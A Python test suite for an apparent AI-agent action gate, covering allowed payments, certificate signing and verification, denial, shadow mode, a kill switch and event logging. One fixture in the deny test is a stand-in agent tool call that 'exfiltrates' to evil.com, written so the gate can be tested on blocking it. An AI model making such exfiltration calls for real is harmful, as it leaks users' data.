import itertools
import json

from bench.runner import run_bench
from gate.cava import action_hash
from gate.certs import (
    BitstringRevocation,
    SingleUseStore,
    verify_certificate,
)
from gate.policy import Verdict
from gate.shim import Mode, RawCall, canonize, decide


def _bank_call() -> RawCall:
    return RawCall(
        runtime="mcp",
        executable="bank.pay",
        operation="transfer",
        args=(("to", "acme-991"), ("amount", "20000"), ("currency", "USD")),
        category="payments",
        evidence_refs=(),
        reversible=False,
    )


def _decide(call, policy, intent, private_key, mode, nonce, kill_switch=False):
    return decide(
        call,
        policy,
        intent,
        private_key,
        mode=mode,
        now=1800000100,
        nonce=nonce,
        timestamp=1800000000,
        scope="test-scope",
        reasoning_commitment="c" * 64,
        revocation_index=9,
        kill_switch=kill_switch,
    )


def test_allow_path(sample_policy, sample_intent, keypair):
    action = canonize(_bank_call(), "n" * 32, 1800000000)
    assert action.targets == ("amount:USD:20000", "to:acme-991")
    messy = canonize(
        RawCall(
            runtime="mcp",
            executable="bank.pay",
            operation="transfer",
            args=(("zzz", "1"), ("amount", "20.00")),
            category="payments",
            evidence_refs=(),
            reversible=False,
        ),
        "m" * 32,
        1800000000,
    )
    assert "zzz=1" in messy.targets
    assert "amount=20.00" in messy.targets
    private_key, public_key = keypair
    d = _decide(
        _bank_call(),
        sample_policy,
        sample_intent,
        private_key,
        Mode.ENFORCE,
        "n" * 32,
    )
    assert d.verdict is Verdict.MET
    assert d.shadow_allowed is False
    assert d.certificate is not None
    assert d.event.action_hash == action_hash(action)
    ok, _ = verify_certificate(
        d.certificate,
        public_key,
        1800000100,
        SingleUseStore(),
        BitstringRevocation(),
    )
    assert ok is True


def test_deny_and_shadow(sample_policy, sample_intent, keypair):
    call = RawCall(
        runtime="mcp",
        executable="evil.tool",
        operation="exfiltrate",
        args=(("to", "evil.com"),),
        category="theft",
        evidence_refs=(),
        reversible=False,
    )
    private_key, _ = keypair
    denied = _decide(
        call, sample_policy, sample_intent, private_key, Mode.ENFORCE, "d" * 32
    )
    assert denied.verdict is Verdict.NOT_MET
    assert denied.certificate is None
    assert denied.shadow_allowed is False
    assert denied.event.reason == "no rule matches"
    shadow = _decide(
        call, sample_policy, sample_intent, private_key, Mode.SHADOW, "s" * 32
    )
    assert shadow.verdict is Verdict.NOT_MET
    assert shadow.certificate is None
    assert shadow.shadow_allowed is True
    assert shadow.event.mode is Mode.SHADOW


def test_kill_switch(sample_policy, sample_intent, keypair):
    private_key, _ = keypair
    d = _decide(
        _bank_call(),
        sample_policy,
        sample_intent,
        private_key,
        Mode.ENFORCE,
        "k" * 32,
        kill_switch=True,
    )
    assert d.verdict is Verdict.NOT_MET
    assert d.certificate is None
    assert d.event.reason == "kill-switch: engaged"


def test_event_contract(sample_policy, sample_intent, keypair):
    private_key, _ = keypair
    d = _decide(
        _bank_call(),
        sample_policy,
        sample_intent,
        private_key,
        Mode.ENFORCE,
        "e" * 32,
    )
    payload = json.loads(d.event.to_json())
    assert list(payload) == [
        "v",
        "id",
        "ts",
        "mode",
        "verdict",
        "action",
        "policy",
        "cert",
        "reason",
        "lat_us",
    ]
    assert payload["v"] == 1
    assert payload["id"] == "evt:" + "e" * 32
    assert (payload["mode"], payload["verdict"]) == ("ENFORCE", "MET")
    assert payload["cert"] == "e" * 32
    assert payload["lat_us"] >= 0.0


def test_decide_bench_measures_real_path(sample_policy, sample_intent, keypair):
    call = _bank_call()
    policy = sample_policy
    intent = sample_intent
    private_key, _ = keypair
    counter = itertools.count()

    def _once():
        nonce = f"bench-{next(counter):06d}"
        _decide(call, policy, intent, private_key, Mode.ENFORCE, nonce)
        return {"decisions": 1}

    r = run_bench("gate.shim.decide", _once, n=50, warmup=5)
    assert (r.name, r.samples) == ("gate.shim.decide", 50)
    assert r.counters == {"decisions": 50}
    assert r.p50_us >= 0.0
